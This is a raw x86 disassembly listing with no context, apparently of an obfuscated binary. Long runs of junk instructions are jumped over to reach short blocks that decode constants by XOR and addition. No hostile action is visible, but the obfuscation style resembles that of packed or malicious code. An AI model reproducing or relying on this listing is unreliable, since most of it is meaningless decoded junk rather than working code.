  40d5cb:	rol    BYTE PTR ds:0x4ece1f48,cl
  40d5d1:	cdq    
  40d5d2:	fdiv   DWORD PTR [edi+0x17929d82]
  40d5d8:	xchg   esi,eax
  40d5d9:	cdq    
  40d5da:	stos   BYTE PTR es:[edi],al
  40d5db:	dec    eax
  40d5dc:	iret   
  40d5dd:	shr    DWORD PTR [eax],cl
  40d5df:	test   eax,0x5bc1d78c
  40d5e4:	in     eax,dx
  40d5e5:	mov    al,al
  40d5e7:	jle    0x40d613
  40d5e9:	jmp    0x7468:0x714d7c62
  40d5f0:	scas   al,BYTE PTR es:[edi]
  40d5f1:	out    dx,eax
  40d5f2:	xchg   esp,eax
  40d5f3:	pop    ebx
  40d5f4:	out    dx,eax
  40d5f5:	jnp    0x40d638
  40d5f7:	sbb    esp,DWORD PTR [edx-0x57]
  40d5fa:	cmp    eax,0x76bb2a1e
  40d5ff:	mov    esi,0x15e50715
  40d604:	mov    fs,WORD PTR [edi-0x571f1f6b]
  40d60a:	mov    ah,0x11
  40d60c:	xchg   edi,eax
  40d60d:	jmp    0x1359:0x462e9043
  40d614:	fld    TBYTE PTR [bp+di+0x360b]
  40d619:	not    BYTE PTR [ebx]
  40d61b:	pop    ss
  40d61c:	and    dl,ah
  40d61e:	leave  
  40d61f:	jmp    FWORD PTR [ebx]
  40d621:	inc    esi
  40d622:	shl    BYTE PTR [ebp-0x34],0xc0
  40d626:	adc    al,0x1d
  40d628:	bnd call DWORD PTR [ecx+0x41509d11]
  40d62f:	cmp    eax,0x8fed81af
  40d634:	cmp    DWORD PTR [ecx+ecx*8],ecx
  40d637:	push   edi
  40d638:	push   esi
  40d639:	fisttp DWORD PTR [edx-0x73]
  40d63c:	sub    DWORD PTR [esi+0x9547a2f],esi
  40d642:	add    BYTE PTR [edx+0x72a0f5ed],0xa5
  40d649:	xchg   ebx,eax
  40d64a:	dec    ebx
  40d64b:	inc    esi
  40d64c:	outs   dx,DWORD PTR ds:[esi]
  40d64d:	mov    ch,0x78
  40d64f:	or     eax,0x5423e733
  40d654:	jb     0x40d62d
  40d656:	mov    bl,BYTE PTR [ebp+ebx*8-0x72a3e28f]
  40d65d:	rcl    DWORD PTR [ebp+0x1b],0x6e
  40d661:	mov    eax,0xdb48c21a
  40d666:	mov    cl,0x3d
  40d668:	outs   dx,DWORD PTR ds:[esi]
  40d669:	xchg   edx,eax
  40d66a:	cmc    
  40d66b:	test   DWORD PTR [eax+esi*8+0x73],0x48046a34
  40d673:	pop    esp
  40d674:	push   cs
  40d675:	(bad)  
  40d676:	xor    edi,edi
  40d678:	sahf   
  40d679:	outs   dx,DWORD PTR ds:[esi]
  40d67a:	pop    ebp
  40d67b:	scas   al,BYTE PTR es:[edi]
  40d67c:	pop    esp
  40d67d:	les    ecx,FWORD PTR [edi+0x516249fe]
  40d683:	enter  0x9a12,0xfd
  40d687:	mov    WORD PTR [esp+eax*4],?
  40d68a:	imul   edx,DWORD PTR [ebx-0x28],0x27
  40d68e:	es adc dl,0x93
  40d692:	xor    DWORD PTR [ecx],edi
  40d694:	cmc    
  40d695:	les    esp,FWORD PTR [edi+0x47]
  40d698:	js     0x40d67a
  40d69a:	ins    DWORD PTR es:[edi],dx
  40d69b:	pop    es
  40d69c:	mov    edx,0xf443b69b
  40d6a1:	sti    
  40d6a2:	les    esi,FWORD PTR [ecx]
  40d6a4:	fcom   DWORD PTR [ecx-0x5361519f]
  40d6aa:	scas   eax,DWORD PTR es:[edi]
  40d6ab:	data16 das 
  40d6ad:	enter  0xe1d0,0x4c
  40d6b1:	xor    eax,0x79a133fd
  40d6b6:	xchg   edx,eax
  40d6b7:	leave  
  40d6b8:	mov    ds:0xe5be434e,al
  40d6bd:	sti    
  40d6be:	cli    
  40d6bf:	mov    ah,0xe6
  40d6c1:	inc    esp
  40d6c2:	mov    ebp,0x4e122729
  40d6c7:	ja     0x40d711
  40d6c9:	leave  
  40d6ca:	xchg   esi,eax
  40d6cb:	push   eax
  40d6cc:	aaa    
  40d6cd:	stos   DWORD PTR es:[edi],eax
  40d6ce:	and    eax,0xc5370801
  40d6d3:	mov    ds:0x5deb5bab,al
  40d6d8:	adc    BYTE PTR [edi-0x7],0x30
  40d6dc:	add    bh,BYTE PTR [edx]
  40d6de:	outs   dx,DWORD PTR ds:[si]
  40d6e0:	jo     0x40d731
  40d6e2:	test   bh,ch
  40d6e4:	sbb    DWORD PTR [esi+0x5d6b0d80],0x41
  40d6eb:	daa    
  40d6ec:	in     eax,dx
  40d6ed:	pop    ss
  40d6ee:	loope  0x40d67b
  40d6f0:	inc    ebp
  40d6f1:	cld    
  40d6f2:	xor    eax,0x7510854
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [esi-0xc],fs
  40d728:	mov    esi,0x7e8d05c7
  40d72d:	jle    0x40d751
  40d72f:	jg     0x40d7af
  40d731:	jle    0x40d6ba
  40d733:	mov    ch,0x30
  40d735:	and    eax,0x4873bc29
  40d73a:	out    0xc0,eax
  40d73c:	mov    eax,ds:0xf13ed24a
  40d741:	lods   al,BYTE PTR ds:[esi]
  40d742:	outs   dx,DWORD PTR ds:[esi]
  40d743:	call   0x63a295b3
  40d748:	jne    0x40d70a
  40d74a:	add    BYTE PTR [edi],dl
  40d74c:	icebp  
  40d74d:	mov    bh,0x46
  40d74f:	jns    0x40d797
  40d751:	stc    
  40d752:	(bad)  
  40d753:	iret   
  40d754:	mov    bl,0x8b
  40d756:	adc    ebp,ebp
  40d758:	adc    DWORD PTR [eax-0x3e],esi
  40d75b:	rcl    BYTE PTR [esp+eax*4],0x7b
  40d75f:	mov    al,0x21
  40d761:	mov    bl,0xee
  40d763:	test   al,0xb8
  40d765:	(bad)  
  40d766:	sbb    BYTE PTR [ebx+0x78],bh
  40d769:	sub    eax,DWORD PTR [edi+edx*2+0x2e]
  40d76d:	test   bh,ah
  40d76f:	cdq    
  40d770:	ret    
  40d771:	out    dx,eax
  40d772:	pop    ds
  40d773:	inc    esp
  40d774:	(bad)  
  40d775:	in     eax,0x7e
  40d777:	or     BYTE PTR [esi-0x60f459f3],0x78
  40d77e:	push   ebx
  40d77f:	fsubr  DWORD PTR [ebx-0x153eceef]
  40d785:	in     eax,0x1
  40d787:	cld    
  40d788:	retf   0x7799
  40d78b:	or     BYTE PTR [edx+0x25],bl
  40d78e:	push   es
  40d78f:	nop
  40d790:	mov    bl,0x53
  40d792:	(bad)  
  40d793:	not    DWORD PTR [ebx-0x3e]
  40d796:	jo     0x40d7f0
  40d798:	xchg   edi,eax
  40d799:	cmp    BYTE PTR [edx+0x6d3dbae0],ch
  40d79f:	idiv   DWORD PTR [edx+0x50188363]
  40d7a5:	les    ebx,FWORD PTR [edi+eax*1-0x71349e93]
  40d7ac:	add    al,BYTE PTR [ecx-0x53]
  40d7af:	push   ss
  40d7b0:	dec    esp
  40d7b1:	mov    WORD PTR [ebx-0x6],es
  40d7b4:	sub    ecx,DWORD PTR [edx+0x41]
  40d7b7:	fdiv   DWORD PTR [edi+0x4b6bf1bf]
  40d7bd:	loope  0x40d801
  40d7bf:	dec    eax
  40d7c0:	xchg   ebx,eax
  40d7c1:	jl     0x40d755
  40d7c3:	pop    es
  40d7c4:	adc    DWORD PTR [eax-0x3f],edx
  40d7c7:	cmp    dl,BYTE PTR [ecx+0x6a]
  40d7ca:	lahf   
  40d7cb:	push   edx
  40d7cc:	mov    esi,0xcbb8514c
  40d7d1:	pop    ebp
  40d7d2:	js     0x40d806
  40d7d4:	mov    ah,BYTE PTR [edi+0x210401a4]
  40d7da:	sub    cl,cl
  40d7dc:	push   esi
  40d7dd:	add    eax,0xa93f6e80
  40d7e2:	mov    esi,0x55df07da
  40d7e7:	jae    0x40d84b
  40d7e9:	push   0x9c0acfed
  40d7ee:	dec    edx
  40d7ef:	fnstenv [edi]
  40d7f1:	and    al,0x63
  40d7f3:	test   DWORD PTR ds:0xb89a3f26,0x20f90395
  40d7fd:	add    eax,0xf04f48ee
  40d802:	and    DWORD PTR [ebp+edx*2-0x13],ebx
  40d806:	add    DWORD PTR [eax],0x2b
  40d809:	pushf  
  40d80a:	cmc    
  40d80b:	sub    al,0xff
  40d80d:	push   ecx
  40d80e:	xor    esi,DWORD PTR [edi+0x48004f5c]
  40d814:	push   cs
  40d815:	icebp  
  40d816:	call   0xad853781
  40d81b:	neg    ebp
  40d81d:	aam    0x33
  40d81f:	xchg   ecx,eax
  40d820:	dec    edi
  40d821:	(bad)  
  40d823:	cs push edx
  40d825:	xor    edi,DWORD PTR [ecx+ebp*2]
  40d828:	push   ecx
  40d829:	int3   
  40d82a:	mov    dl,0x9f
  40d82c:	jnp    0x40d7c0
  40d82e:	inc    eax
  40d82f:	rcl    ebp,1
  40d831:	daa    
  40d832:	adc    DWORD PTR [ebx-0xda0fb26],ecx
  40d838:	xlat   BYTE PTR ds:[ebx]
  40d839:	cs hlt 
  40d83b:	lods   al,BYTE PTR ds:[esi]
  40d83c:	mov    dh,0x75
  40d83e:	mov    al,0xd0
  40d840:	jae    0x40d84e
  40d842:	iret   
  40d843:	dec    eax
  40d844:	add    ch,bh
  40d846:	sti    
  40d847:	cmp    ebx,esp
  40d849:	or     al,0xb1
  40d84b:	lods   al,BYTE PTR ds:[esi]
  40d84c:	int3   
  40d84d:	mov    al,ds:0x6b91b172
  40d852:	xor    edx,esi
  40d854:	mov    dl,0xb1
  40d856:	mov    bl,0x11
  40d858:	mov    ecx,0xb51a2a2d
  40d85d:	inc    edi
  40d85e:	pop    ecx
  40d85f:	push   0x5
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	push   edx
  40d879:	inc    ecx
  40d87a:	cmp    ebp,DWORD PTR [esi+0x7e7e8a29]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d8b7
  40d885:	cmp    BYTE PTR [ebx],al
  40d887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d888:	and    al,BYTE PTR [ecx]
  40d88a:	ds dec ecx
  40d88c:	and    BYTE PTR [edx+0x1a91f274],ah
  40d892:	sub    ebp,DWORD PTR [esi+eiz*2]
  40d895:	(bad)
  40d898:	call   0xf3d6:0x2900b86c
  40d89f:	shr    BYTE PTR [esi],0x2d
  40d8a2:	pop    eax
  40d8a3:	sti    
  40d8a4:	fstp   TBYTE PTR [esp+eax*4]
  40d8a7:	lock xor ebp,DWORD PTR [edx+0x60b28c53]
  40d8ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8af:	jmp    0x40f4:0x6aed4779
  40d8b6:	hlt    
  40d8b7:	dec    eax
  40d8b8:	sbb    ah,BYTE PTR [edi+0x44]
  40d8bb:	mov    ds:0xba87dfc9,eax
  40d8c0:	mov    al,0x88
  40d8c2:	jne    0x40d8b9
  40d8c4:	(bad)  
  40d8c5:	scas   eax,DWORD PTR es:[edi]
  40d8c6:	jcxz   0x40d8aa
  40d8c9:	push   ebx
  40d8ca:	jne    0x40d881
  40d8cc:	cmp    DWORD PTR [edi+0x1742f1bf],ebp
  40d8d2:	pusha  
  40d8d3:	sub    ch,BYTE PTR [ebx]
  40d8d5:	sbb    eax,0xf61d9b59
  40d8da:	call   0x489d:0x42924dae
  40d8e1:	es das 
  40d8e3:	outs   dx,BYTE PTR ds:[esi]
  40d8e4:	mov    ss,WORD PTR [ecx-0x13]
  40d8e7:	push   0x802fe2e4
  40d8ec:	push   ebp
  40d8ed:	fistp  QWORD PTR [ebp+0x37]
  40d8f0:	loop   0x40d8e4
  40d8f2:	ja     0x40d8ac
  40d8f4:	lods   eax,DWORD PTR ds:[esi]
  40d8f5:	or     DWORD PTR [eax-0x14ec792e],edx
  40d8fb:	mov    edx,0xbc17247
  40d900:	retf   0x60e9
  40d903:	lea    ecx,[ebx+esi*2+0x2a]
  40d907:	fist   WORD PTR [eax-0x602df439]
  40d90d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d90e:	cdq    
  40d90f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d910:	lock (bad) 
  40d912:	in     eax,dx
  40d913:	into   
  40d914:	dec    edx
  40d915:	jne    0x40d92f
  40d917:	cmc    
  40d918:	je     0x40d977
  40d91a:	or     eax,0xe9d44adc
  40d91f:	mov    ch,0xcc
  40d921:	ror    esp,0x9a
  40d924:	aas    
  40d925:	jb     0x40d950
  40d927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d928:	lahf   
  40d929:	push   esp
  40d92a:	jmp    0x8c8b92b1
  40d92f:	into   
  40d930:	jmp    0x86d8cb26
  40d935:	xchg   ebp,eax
  40d936:	jns    0x1776dc10
  40d93c:	cld    
  40d93d:	loopne 0x40d947
  40d93f:	mov    WORD PTR [eax+0x44],ds
  40d942:	sahf   
  40d943:	push   edx
  40d944:	imul   esi,DWORD PTR [ecx-0x1],0xa5580b06
  40d94b:	mov    ch,0x36
  40d94d:	pop    ecx
  40d94e:	adc    ebp,DWORD PTR [esi+0x27]
  40d951:	push   ebx
  40d952:	push   edx
  40d953:	cmp    al,0xbe
  40d955:	leave  
  40d956:	imul   esp,DWORD PTR [ebx-0x12298eac],0x4d
  40d95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d95e:	popa   
  40d95f:	dec    eax
  40d960:	push   es
  40d961:	outs   dx,BYTE PTR ds:[esi]
  40d962:	ins    BYTE PTR es:[edi],dx
  40d963:	sub    edx,DWORD PTR [ebp-0x26]
  40d966:	push   cs
  40d967:	mov    al,bl
  40d969:	mov    edx,0xa91c3ff5
  40d96e:	arpl   dx,dx
  40d970:	mov    ecx,DWORD PTR ds:0x67ae2fbf
  40d976:	fld    QWORD PTR [esi+ecx*8-0x4bb59ba6]
  40d97d:	cmp    edi,DWORD PTR [edi]
  40d97f:	xor    eax,0x454bcbed
  40d984:	ins    BYTE PTR es:[edi],dx
  40d985:	dec    esp
  40d986:	int    0x8b
  40d988:	(bad)  
  40d989:	in     eax,dx
  40d98a:	ret    0x7651
  40d98d:	jbe    0x40d9ed
  40d98f:	mov    ebp,edi
  40d991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d992:	inc    ecx
  40d993:	fidiv  WORD PTR [ebx-0x2]
  40d996:	cmc    
  40d997:	inc    esi
  40d998:	xor    al,0x65
  40d99a:	inc    eax
  40d99b:	ret    
  40d99c:	add    edi,DWORD PTR [ebx-0x6e65c1]
  40d9a2:	and    BYTE PTR [eax+0x662fe2f2],dh
  40d9a8:	neg    BYTE PTR [eax-0x8]
  40d9ab:	or     eax,0x20b6fdc1
  40d9b0:	xchg   ebx,ecx
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	adc    BYTE PTR [esi-0x7422b5e0],ch
  40d9c9:	jle    0x40da49
  40d9cb:	and    bh,BYTE PTR [edi+0x7e]
  40d9ce:	jle    0x40da16
  40d9d0:	xor    eax,0xbf067e80
  40d9d5:	or     eax,0x6144c0fd
  40d9da:	xchg   ecx,eax
  40d9db:	push   edi
  40d9dc:	mov    al,0xa5
  40d9de:	xlat   BYTE PTR ds:[ebx]
  40d9df:	outs   dx,BYTE PTR ds:[esi]
  40d9e0:	fiadd  WORD PTR [ecx]
  40d9e2:	(bad)  
  40d9e3:	sbb    ah,dl
  40d9e5:	mov    edx,0x44d2c30e
  40d9ea:	mov    dh,0x5
  40d9ec:	call   0x5d0c3be4
  40d9f1:	xchg   edx,eax
  40d9f2:	push   esp
  40d9f3:	cmc    
  40d9f4:	cs gs loope 0x40d9b7
  40d9f8:	lock push ecx
  40d9fa:	(bad)  
  40d9fb:	xor    BYTE PTR [esi-0xdaaa09e],al
  40da01:	or     BYTE PTR [ebx+ecx*2+0x6b],ah
  40da05:	or     dl,BYTE PTR [edx]
  40da07:	into   
  40da08:	jb     0x40da65
  40da0a:	cld    
  40da0b:	pop    edi
  40da0c:	add    DWORD PTR [esi-0x6d],ebx
  40da0f:	or     ch,BYTE PTR [ecx-0x4038ff38]
  40da15:	push   ebp
  40da16:	xchg   esi,eax
  40da17:	mov    esp,0x2e5a1373
  40da1c:	ficom  DWORD PTR [eax-0x24]
  40da1f:	out    0x8f,eax
  40da21:	cmp    DWORD PTR [edx+edx*8+0x28ce68f],esi
  40da28:	jmp    0x40da14
  40da2a:	xchg   edi,eax
  40da2b:	push   0xffffffbe
  40da2d:	inc    edi
  40da2e:	mov    fs,WORD PTR [ebp+ebx*4-0x9]
  40da32:	pop    esp
  40da33:	dec    esi
  40da34:	pop    ebx
  40da35:	cdq    
  40da36:	pop    eax
  40da37:	jp     0x40da38
  40da39:	pop    ecx
  40da3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da3b:	and    dh,BYTE PTR [bp+di]
  40da3e:	inc    edi
  40da3f:	es dec ah
  40da42:	inc    eax
  40da43:	mov    ebp,0x5035e660
  40da48:	push   ds
  40da49:	inc    edx
  40da4a:	shl    DWORD PTR [esi],cl
  40da4c:	in     al,0xe0
  40da4e:	push   cs
  40da4f:	jecxz  0x40da71
  40da51:	add    esi,ebp
  40da53:	sub    DWORD PTR [edi],eax
  40da55:	(bad)  
  40da56:	clc    
  40da57:	les    esi,FWORD PTR [ebp+0x5f270978]
  40da5d:	dec    esi
  40da5e:	int    0xea
  40da60:	scas   eax,DWORD PTR es:[edi]
  40da61:	or     DWORD PTR [ebx+0x20],ebp
  40da64:	fcomip st,st(6)
  40da66:	int3   
  40da67:	movntq QWORD PTR [esi],mm7
  40da6a:	add    eax,0x77226c8d
  40da6f:	adc    al,0xcb
  40da71:	add    esi,DWORD PTR [edx-0x20da9978]
  40da77:	call   0x5ff1:0x57b0f448
  40da7e:	push   ss
  40da7f:	jae    0x40da91
  40da81:	cmc    
  40da82:	mov    bh,0x3d
  40da84:	or     esi,DWORD PTR [ecx-0x2f1b5389]
  40da8a:	add    dh,BYTE PTR [edx]
  40da8c:	sbb    BYTE PTR [esi+0xf],bh
  40da8f:	lods   al,BYTE PTR ds:[esi]
  40da90:	add    DWORD PTR [ebx+0x2c],ecx
  40da93:	push   ebp
  40da94:	sahf   
  40da95:	bound  esp,QWORD PTR [ecx-0x67]
  40da98:	and    eax,DWORD PTR [eax-0x1a61c3c7]
  40da9e:	push   eax
  40da9f:	retf   0x84d1
  40daa2:	loopne 0x40da6f
  40daa4:	inc    edi
  40daa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daa6:	fiadd  DWORD PTR [esi-0x2f657761]
  40daac:	adc    al,0x3e
  40daae:	stos   BYTE PTR es:[edi],al
  40daaf:	or     al,BYTE PTR [ebx]
  40dab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab2:	nop
  40dab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dab4:	lods   al,BYTE PTR ds:[esi]
  40dab5:	dec    esp
  40dab6:	dec    ebp
  40dab7:	fdiv   QWORD PTR ss:[ecx+0x3178f957]
  40dabe:	jns    0x40db28
  40dac0:	(bad)
  40dac3:	cmp    DWORD PTR [esi+0x163b8a07],0x9d356e16
  40dacd:	xchg   DWORD PTR [ebp+0x2e],ebx
  40dad0:	jne    0x40da79
  40dad2:	cmp    esp,edx
  40dad4:	mov    al,0xf5
  40dad6:	or     DWORD PTR [ebp+0x4a203053],0xf716198b
  40dae0:	push   ebx
  40dae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dae2:	repnz rcr DWORD PTR [esi-0x29],cl
  40dae6:	stos   BYTE PTR es:[edi],al
  40dae7:	mov    eax,ebp
  40dae9:	cmp    BYTE PTR [edx+0x5],ch
  40daec:	fstp   TBYTE PTR [esi+0x3f94d0bd]
  40daf2:	lods   eax,DWORD PTR ds:[esi]
  40daf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf4:	mov    dl,BYTE PTR [ebx+0x60cb090]
  40dafa:	sbb    BYTE PTR [ecx-0x75],cl
  40dafd:	inc    ebp
  40dafe:	in     al,0xf
  40db00:	scas   eax,DWORD PTR es:[edi]
  40db01:	shr    DWORD PTR [ebx],0xe0
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0xd9b6fdf0
  40db32:	lds    esp,FWORD PTR [edx-0x22]
  40db35:	or     DWORD PTR [eax+0x7f227e7e],0x74147e7e
  40db3f:	mov    eax,ds:0x91bb12b6
  40db44:	scas   eax,DWORD PTR es:[edi]
  40db45:	cmp    esp,ebp
  40db47:	xchg   DWORD PTR [ecx],edx
  40db49:	js     0x40db99
  40db4b:	daa    
  40db4c:	repnz fwait
  40db4e:	fs cld 
  40db50:	pusha  
  40db51:	pop    ss
  40db52:	inc    ebx
  40db53:	cmc    
  40db54:	pop    es
  40db55:	(bad)  
  40db56:	repz or al,0x80
  40db59:	mov    ebp,0xe0152722
  40db5e:	inc    edx
  40db5f:	lock mov ds:0xb0f6c7aa,al
  40db65:	mov    ebx,0xf2298407
  40db6a:	mov    ah,0x52
  40db6c:	mov    dh,0xf6
  40db6e:	shl    edi,0xa8
  40db71:	mov    esp,0xd16fb32c
  40db76:	pusha  
  40db77:	cli    
  40db78:	in     eax,0x71
  40db7a:	int    0x22
  40db7c:	leave  
  40db7d:	mov    BYTE PTR [eax-0x5a],0x2f
  40db81:	push   ebp
  40db82:	in     al,0xec
  40db84:	shl    DWORD PTR [edx+ecx*1],1
  40db87:	mov    es,WORD PTR [eax+0x2f2a6a2f]
  40db8d:	sub    al,0x61
  40db8f:	jl     0x40dbf4
  40db91:	sub    al,0x3a
  40db93:	outs   dx,BYTE PTR ds:[esi]
  40db94:	lods   eax,DWORD PTR ds:[esi]
  40db95:	and    DWORD PTR [edi+edx*1-0x5e],edi
  40db99:	ins    BYTE PTR es:[edi],dx
  40db9a:	js     0x40db75
  40db9c:	or     eax,0x77eb8963
  40dba1:	js     0x40dc0d
  40dba3:	es popa 
  40dba5:	repnz pop es
  40dba7:	dec    esp
  40dba8:	ss cld 
  40dbaa:	or     dl,BYTE PTR [esi+0x544a422b]
  40dbb0:	pushw  ss
  40dbb2:	shl    DWORD PTR [edi],0xee
  40dbb5:	push   DWORD PTR [ebp-0x30]
  40dbb8:	int3   
  40dbb9:	inc    ebp
  40dbba:	pop    ds
  40dbbb:	aas    
  40dbbc:	(bad)  
  40dbbd:	shl    DWORD PTR [esi],cl
  40dbbf:	cs call 0x73aac72
  40dbc5:	dec    ebx
  40dbc6:	cld    
  40dbc7:	pop    edi
  40dbc8:	aas    
  40dbc9:	fnstcw WORD PTR [ebp-0x7e5c2dd4]
  40dbcf:	loopne 0x40dc16
  40dbd1:	sub    esi,ecx
  40dbd3:	rcr    BYTE PTR [esi+0x60],0xd4
  40dbd7:	fstp   DWORD PTR [esi-0x42]
  40dbda:	lahf   
  40dbdb:	sbb    DWORD PTR ds:0x47e5718c,eax
  40dbe1:	in     al,0xab
  40dbe3:	xor    al,0xe8
  40dbe5:	mov    ebp,0x96fc54f6
  40dbea:	push   ds
  40dbeb:	and    ch,dl
  40dbed:	sbb    DWORD PTR [esi-0x3e833b2],ebx
  40dbf3:	clc    
  40dbf4:	mov    eax,0xd0aac66a
  40dbf9:	xor    BYTE PTR [esp+ebp*1],0x3d
  40dbfd:	push   eax
  40dbfe:	mov    WORD PTR [eax-0x70e533d6],?
  40dc04:	jmp    0x40dc23
  40dc06:	xor    al,0x9f
  40dc08:	sbb    al,0x2a
  40dc0a:	fidiv  DWORD PTR [eax-0x6c643689]
  40dc10:	fist   WORD PTR [ecx+0x343c56a4]
  40dc16:	xchg   ebx,eax
  40dc17:	mov    eax,ds:0xac59e1eb
  40dc1c:	std    
  40dc1d:	icebp  
  40dc1e:	mov    ecx,0x67261dcd
  40dc23:	cmp    ebp,DWORD PTR [ecx]
  40dc25:	aas    
  40dc26:	mov    ebp,0x7201b554
  40dc2b:	(bad)  
  40dc2c:	sahf   
  40dc2d:	(bad)  
  40dc2e:	ss xchg ecx,eax
  40dc30:	mov    eax,ds:0x35c0e776
  40dc35:	add    edx,DWORD PTR [ebx-0x16]
  40dc38:	mov    ecx,ebx
  40dc3a:	lods   eax,DWORD PTR ds:[esi]
  40dc3b:	js     0x40dc2f
  40dc3d:	(bad)  
  40dc3e:	out    0xfe,eax
  40dc40:	ins    DWORD PTR es:[edi],dx
  40dc41:	aad    0x7b
  40dc43:	scas   al,BYTE PTR es:[edi]
  40dc44:	movq   mm3,QWORD PTR [esi+0x59f8eda]
  40dc4b:	sbb    ecx,DWORD PTR [edx-0x15]
  40dc4e:	sbb    DWORD PTR [ebp-0x6f],0xffffff87
  40dc52:	jmp    0x2fdbfaae
  40dc57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc58:	fisubr WORD PTR [edi+esi*2]
  40dc5b:	inc    eax
  40dc5c:	test   DWORD PTR [ecx+ecx*2],edi
  40dc5f:	or     BYTE PTR [edx+edi*4],cl
  40dc62:	in     al,dx
  40dc63:	dec    ecx
  40dc64:	jno    0x40dcd0
  40dc66:	add    al,0xe6
  40dc68:	fiadd  DWORD PTR [ebx]
  40dc6a:	ret    0x558b
  40dc6d:	adc    al,0xf
  40dc6f:	scas   eax,DWORD PTR es:[edi]
  40dc70:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	mov    edx,0xb537e7d3
  40dce1:	mov    DWORD PTR [esi+0x7e],edi
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dd12
  40dce9:	or     ebp,edx
  40dceb:	inc    edx
  40dcec:	js     0x40dd43
  40dcee:	add    ah,al
  40dcf0:	push   ds
  40dcf1:	std    
  40dcf2:	push   ebp
  40dcf3:	call   0x1893:0x5fc9765a
  40dcfa:	xlat   BYTE PTR ds:[ebx]
  40dcfb:	icebp  
  40dcfc:	mov    ebx,0xdae43c1b
  40dd01:	inc    esp
  40dd02:	jle    0x40dd32
  40dd04:	loop   0x40dc86
  40dd06:	ret    0x4736
  40dd09:	addr16 jge 0x40dc9a
  40dd0c:	test   DWORD PTR ds:0xf005b745,edx
  40dd12:	rep ins BYTE PTR es:[edi],dx
  40dd14:	nop
  40dd15:	fcomp  QWORD PTR [eax+0x1e]
  40dd18:	mov    ch,0xa2
  40dd1a:	jb     0x40dcb9
  40dd1c:	push   edx
  40dd1d:	(bad)  
  40dd1e:	xchg   ebp,eax
  40dd1f:	jp     0x40dcb6
  40dd21:	retf   
  40dd22:	mov    bl,0xc
  40dd24:	imul   esi,DWORD PTR [esp+edi*2],0x9e722837
  40dd2b:	mov    ah,ch
  40dd2d:	retf   
  40dd2e:	jg     0x40dd9f
  40dd30:	jg     0x40dccf
  40dd32:	call   0xabedbef9
